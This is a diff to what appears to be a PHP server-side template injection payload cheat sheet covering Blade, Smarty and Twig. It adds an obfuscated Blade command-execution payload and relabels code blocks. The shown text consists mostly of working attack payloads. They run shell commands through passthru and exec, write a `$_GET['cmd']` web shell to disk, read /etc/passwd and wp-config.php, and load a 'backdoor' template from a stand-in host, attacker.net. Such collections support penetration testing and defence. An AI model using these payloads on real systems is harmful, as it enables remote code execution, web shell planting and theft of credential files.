@@ -21,21 +21,34 @@
 
 ## Templating Libraries
 
-| Template Name  | Payload Format |
-| -------------- | --------- |
-| Laravel Blade  | `{{ }}`   |
-| Latte          | `{var $X=""}{$X}`   |
-| Mustache       | `{{ }}`   |
-| Plates         | `<?= ?>`  |
-| Smarty         | `{ }`     |
-| Twig           | `{{ }}`   |
+| Template Name   | Payload Format |
+| --------------- | --------- |
+| Blade (Laravel) | `{{ }}`   |
+| Latte           | `{var $X=""}{$X}`   |
+| Mustache        | `{{ }}`   |
+| Plates          | `<?= ?>`  |
+| Smarty          | `{ }`     |
+| Twig            | `{{ }}`   |
+
+## Blade
+
+[Official website](https://laravel.com/docs/master/blade)
+> Blade is the simple, yet powerful templating engine that is included with Laravel.
+
+The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`.
+
+```php
+{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
+```
+
+---
 
 ## Smarty
 
 [Official website](https://www.smarty.net/docs/en/)
 > Smarty is a template engine for PHP.
 
-```python
+```php
 {$smarty.version}
 {php}echo `id`;{/php} //deprecated in smarty v3
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
@@ -52,7 +65,7 @@
 
 ### Twig - Basic Injection
 
-```python
+```php
 {{7*7}}
 {{7*'7'}} would result in 49
 {{dump(app)}}
@@ -62,7 +75,7 @@
 
 ### Twig - Template Format
 
-```python
+```php
 $output = $twig > render (
   'Dear' . $_GET['custom_greeting'],
   array("first_name" => $user.first_name)
@@ -76,14 +89,14 @@ $output = $twig > render (
 
 ### Twig - Arbitrary File Reading
 
-```python
+```php
 "{{'/etc/passwd'|file_excerpt(1,30)}}"@
 {{include("wp-config.php")}}
 ```
 
 ### Twig - Code Execution
 
-```python
+```php
 {{self}}
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
@@ -249,4 +262,5 @@ layout template:
 
 ## References
 
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere- YesWeHack - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
 - [Server Side Template Injection (SSTI) via Twig escape handler - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
